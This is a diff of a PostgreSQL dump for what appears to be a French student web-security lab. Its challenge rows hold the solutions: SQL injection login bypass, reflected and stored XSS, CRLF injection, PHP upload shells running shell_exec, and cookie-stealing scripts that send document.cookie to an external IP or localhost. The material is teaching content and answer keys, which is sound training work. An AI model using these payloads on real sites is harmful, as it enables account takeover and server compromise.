@@ -93,6 +93,42 @@ ALTER SEQUENCE public.challenges_id_seq OWNED BY public.challenges.id;
 
 
 --
+-- Name: commentaires; Type: TABLE; Schema: public; Owner: ensimag
+--
+
+CREATE TABLE public.commentaires (
+    id integer NOT NULL,
+    titre character varying(500) NOT NULL,
+    message character varying(1000) NOT NULL,
+    CONSTRAINT commentaires_id_check CHECK ((id >= 0))
+);
+
+
+ALTER TABLE public.commentaires OWNER TO ensimag;
+
+--
+-- Name: commentaires_id_seq; Type: SEQUENCE; Schema: public; Owner: ensimag
+--
+
+CREATE SEQUENCE public.commentaires_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER TABLE public.commentaires_id_seq OWNER TO ensimag;
+
+--
+-- Name: commentaires_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: ensimag
+--
+
+ALTER SEQUENCE public.commentaires_id_seq OWNED BY public.commentaires.id;
+
+
+--
 -- Name: cours; Type: TABLE; Schema: public; Owner: ensimag
 --
 
@@ -347,6 +383,13 @@ ALTER TABLE ONLY public.challenges ALTER COLUMN id SET DEFAULT nextval('public.c
 
 
 --
+-- Name: commentaires id; Type: DEFAULT; Schema: public; Owner: ensimag
+--
+
+ALTER TABLE ONLY public.commentaires ALTER COLUMN id SET DEFAULT nextval('public.commentaires_id_seq'::regclass);
+
+
+--
 -- Name: cours id; Type: DEFAULT; Schema: public; Owner: ensimag
 --
 
@@ -402,13 +445,26 @@ admin	admin@hotmail.fr	e140b8f9a3f6235f1cc8f44b3204126078a5228385b244433737de635
 --
 
 COPY public.challenges (id, nom, ordre, flag, solution, indice, difficulte, description) FROM stdin;
-7	Offuscation	4	facileadecoder	Le tableau définit en début de code [si:facileadecoder] permet de déterminer le nom d'utilisateur valide et le mot de passe. Le nom d'utilisateur est "si", le mot de passe "facileadecoder".	Analysez le code javascript du fichier "chall2.js" grâce à l'outil inspecteur de Google Chrome (Ctrl + Maj + i)	1	Essayez de vous connecter !
-4	Become an admin	1	lh456regjduiz	Il suffit de trouver la bonne injection SQL à saisir pour pouvoir s'authentifier en tant qu'administrateur. \r\nDans notre cas, une solution est : ' or '1' = '1.\r\nEn effet, voici à quoi ressemble la requête SQL côté serveur :\r\n"SELECT COUNT(identifiant) FROM Administrateurs WHERE identifiant = '" + identifiant + "' AND mdp = '" + password + "'".\r\nAvec l’injection SQL précédente, cela donne :\r\n"SELECT COUNT(identifiant) FROM Administrateurs WHERE identifiant = 'admin' AND mdp = '' or '1' = '1'"	Les injections SQL vous disent quelque chose ? 	1	Trouvez un moyen de vous connecter au portail en tant qu'administrateur !
-6	XSS réfléchi	2	masterzap	Il suffit de taper dans le champ un script Javascript quelconque. Voici une possibilité : \r\n<script>alert("Bonjour")</script>	La réponse est dans le cours !	1	Essayez d'executer du Javascript sur cette page !
-5	Formulaire à contourner	3	totalaccess	Utilisez un logiciel tel que ZAP ou WebScarab pour faire des rejeux de requête. (l'outil cURL peut très bien faire l'affaire).\r\nAvec ZAP, effectuez une première requête en remplissant tous les champs du formulaire. \r\nComme expliqué dans le cours, renvoyez la requête HTTP en modifiant les champs de la requête.	Never Trust User Inputs	1	Apprenez à manipuler les requêtes HTTP sans votre navigateur ! 
-8	Formulaire bloqué...	5	inspectorIsCool	Il suffit de modifier le code source de la page HTML à l'aide de l'outil inspecteur de Google Chrome (Ctrl + Maj + I). \r\nChercher le bouton "S'inscrire" dans le code et supprimer sa balise "disabled". Vous pouvez alors utiliser le formulaire ! 	Utilisez Google Chrome et son outil inspecteur.	0	Essayez d'utiliser ce challenge même s'il semble bloqué...
-9	CRLF	6	encode	Il suffit d'écrire les adresses emails séparées des caractères %0A. \r\nEn hexadécimal 0A vaut 10 et le code ASCII du retour à la ligne est 10. Ainsi le mail de réinitialisation de mot de passe sera envoyé aux deux adresses emails. 	La réponse est dans le cours CRLF !	0	Mettez-vous en copie du mail de réinitialisation de l'utilisateur nicolas@lab-solutec.fr.
-10	Upload	7	filterYourUploads	Il suffit de faire un fichier PHP pour récupérer le contenu du fichier flag.txt.\r\nLa première étape consiste à localiser le fichier ciblé. On peut procéder en faisant un locate, find ou en affichant les fichiers d'un dossier à l'aide de la commande ls.\r\nLe script PHP suivant fait l'affaire : \r\n<?php \r\n\t$output = shell_exec('ls ../');\r\n\techo "<pre>$output</pre>";\r\n?>\r\nPuis pour récupérer le fichier il suffit de faire : \r\n<?php \r\n\t$output = shell_exec('cat ../flag.txt');\r\n\techo "<pre>$output</pre>";\r\n?>\r\n	Uploader un fichier PHP pour récupérer le contenu de flag.txt.	1	Essayez de récupérer le contenu du fichier flag.txt pour valider le challenge !
+7	Offuscation	3	facileadecoder	Le tableau définit en début de code [si:facileadecoder] permet de déterminer le nom d'utilisateur valide et le mot de passe. Le nom d'utilisateur est "si", le mot de passe "facileadecoder".	Analysez le code javascript du fichier "chall2.js" grâce à l'outil inspecteur de Google Chrome (Ctrl + Maj + i)	1	Essayez de vous connecter !
+6	XSS réfléchi	1	masterzap	Il suffit de taper dans le champ un script Javascript quelconque. Voici une possibilité : \r\n<script>alert("Bonjour")</script>	La réponse est dans le cours !	1	Essayez d'executer du Javascript sur cette page !
+9	CRLF	5	encode	Il suffit d'écrire les adresses emails séparées des caractères %0A. \r\nEn hexadécimal 0A vaut 10 et le code ASCII du retour à la ligne est 10. Ainsi le mail de réinitialisation de mot de passe sera envoyé aux deux adresses emails. 	La réponse est dans le cours CRLF !	0	Mettez-vous en copie du mail de réinitialisation de l'utilisateur nicolas@lab-solutec.fr.
+8	Formulaire bloqué...	4	inspectorIsCool	Il suffit de modifier le code source de la page HTML à l'aide de l'outil inspecteur de Google Chrome (Ctrl + Maj + I). \r\nChercher le bouton "S'inscrire" dans le code et supprimer sa balise "disabled". Vous pouvez alors utiliser le formulaire ! 	Utilisez Google Chrome et son outil inspecteur.	0	Essayez d'utiliser ce challenge même s'il semble bloqué...
+10	Upload	6	filterYourUploads	Il suffit de faire un fichier PHP pour récupérer le contenu du fichier flag.txt.\r\nLa première étape consiste à localiser le fichier ciblé. On peut procéder en faisant un locate, find ou en affichant les fichiers d'un dossier à l'aide de la commande ls.\r\nLe script PHP suivant fait l'affaire : \r\n<?php \r\n\t$output = shell_exec('ls ../');\r\n\techo "<pre>$output</pre>";\r\n?>\r\nPuis pour récupérer le fichier il suffit de faire : \r\n<?php \r\n\t$output = shell_exec('cat ../flag.txt');\r\n\techo "<pre>$output</pre>";\r\n?>\r\n	Uploader un fichier PHP pour récupérer le contenu de flag.txt.	1	Essayez de récupérer le contenu du fichier flag.txt pour valider le challenge !
+4	Become an admin	7	lh456regjduiz	Il suffit de trouver la bonne injection SQL à saisir pour pouvoir s'authentifier en tant qu'administrateur. \r\nDans notre cas, une solution est : ' or '1' = '1.\r\nEn effet, voici à quoi ressemble la requête SQL côté serveur :\r\n"SELECT COUNT(identifiant) FROM Administrateurs WHERE identifiant = '" + identifiant + "' AND mdp = '" + password + "'".\r\nAvec l’injection SQL précédente, cela donne :\r\n"SELECT COUNT(identifiant) FROM Administrateurs WHERE identifiant = 'admin' AND mdp = '' or '1' = '1'"	Les injections SQL vous disent quelque chose ? 	1	Trouvez un moyen de vous connecter au portail en tant qu'administrateur !
+5	Formulaire à contourner	2	totalaccess	Utilisez un logiciel tel que ZAP ou WebScarab pour faire des rejeux de requête. (l'outil cURL peut très bien faire l'affaire).\r\nAvec ZAP, effectuez une première requête en remplissant tous les champs du formulaire. \r\nComme expliqué dans le cours, renvoyez la requête HTTP en modifiant les champs de la requête.	Never Trust User Inputs	1	Apprenez à manipuler les requêtes HTTP sans votre navigateur ! 
+11	XSS stockée	8	youarearealhacker	Pour éviter d’avoir à installer un gros serveur pour récupérer le cookie de session, on peut utiliser la commande python pour ouvrir un petit serveur HTTP instantanément sur notre machine le temps de la validation du challenge. \r\nhttp://blog.rom1v.com/2009/12/creer...\r\nEn ligne de commande :\r\npython -m SimpleHTTPServer 8080\r\n\r\nTest de fonctionnement :\r\nOn peut tester rapidement la réponse de celui-ci via un autre terminal :\r\nwget -O- http://$(wget -qO- icanhazip.com):8080/lol\r\n\r\nOn peut en profiter pour récupérer son IP externe.\r\nSi aucune information n’apparaît sur le terminal du serveur c’est qu’un pare-feu bloque certainement le port d’entrée (routage NAT de port de la box, routeur...).\r\nSi tout se passe bien, une requête pour le fichier lol est effectuée et bien visible sur le terminal du serveur.\r\n\r\nUtilisation de la faille xss sur la page du challenge :\r\nUne fois configuré, l’exploitation xss de base de type :\r\n<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>\r\n\r\npermet d’obtenir son propre cookie "challenge_frame=1" si on accepte la redirection depuis notre navigateur.\r\nAu bout de quelque temps d’attente on récupère le cookie de session ADMIN sur notre serveur. Il permet de valider le challenge et de commencer à refermer rapidement notre port.	Utilisez une faille de type XSS stockée pour voler les cookies de l'administrateur du site web.	1	Essayez de voler le cookie de connexion de l'administrateur et utilisez-le pour valider le challenge !
+\.
+
+
+--
+-- Data for Name: commentaires; Type: TABLE DATA; Schema: public; Owner: ensimag
+--
+
+COPY public.commentaires (id, titre, message) FROM stdin;
+6	fezfezf	zefezfezfezf
+7	fezfezf	zefezfezfezf
+8	fezfezf	zefezfezfezf
+21	fezfez	<script>window.location = "http://localhost:8080/" + document.cookie</script>
 \.
 
 
@@ -459,6 +515,9 @@ COPY public.suiviutilisateurschallenges (id, identifiant, idchallenge) FROM stdi
 4	nicolas	4
 6	nico	4
 7	nico	6
+8	nicolas	10
+9	nicolas	11
+10	nicolas	6
 \.
 
 
@@ -470,6 +529,7 @@ COPY public.suiviutilisateurscours (id, identifiant, idcours) FROM stdin;
 5	nico	15
 6	nico	16
 7	nico	17
+8	nicolas	17
 \.
 
 
@@ -499,7 +559,14 @@ nicolas	nicolas@hotmail.fr	1f0826184880fe739c0b2c483f420a35c5893ac056fba18f3adfb
 -- Name: challenges_id_seq; Type: SEQUENCE SET; Schema: public; Owner: ensimag
 --
 
-SELECT pg_catalog.setval('public.challenges_id_seq', 10, true);
+SELECT pg_catalog.setval('public.challenges_id_seq', 11, true);
+
+
+--
+-- Name: commentaires_id_seq; Type: SEQUENCE SET; Schema: public; Owner: ensimag
+--
+
+SELECT pg_catalog.setval('public.commentaires_id_seq', 21, true);
 
 
 --
@@ -527,14 +594,14 @@ SELECT pg_catalog.setval('public.solutionschallengesutilisateurs_id_seq', 1, tru
 -- Name: suiviutilisateurschallenges_id_seq; Type: SEQUENCE SET; Schema: public; Owner: ensimag
 --
 
-SELECT pg_catalog.setval('public.suiviutilisateurschallenges_id_seq', 7, true);
+SELECT pg_catalog.setval('public.suiviutilisateurschallenges_id_seq', 10, true);
 
 
 --
 -- Name: suiviutilisateurscours_id_seq; Type: SEQUENCE SET; Schema: public; Owner: ensimag
 --
 
-SELECT pg_catalog.setval('public.suiviutilisateurscours_id_seq', 7, true);
+SELECT pg_catalog.setval('public.suiviutilisateurscours_id_seq', 8, true);
 
 
 --
@@ -566,6 +633,14 @@ ALTER TABLE ONLY public.administrateurs
 
 ALTER TABLE ONLY public.challenges
     ADD CONSTRAINT challenges_pkey PRIMARY KEY (id);
+
+
+--
+-- Name: commentaires commentaires_pkey; Type: CONSTRAINT; Schema: public; Owner: ensimag
+--
+
+ALTER TABLE ONLY public.commentaires
+    ADD CONSTRAINT commentaires_pkey PRIMARY KEY (id);
 
 
 --
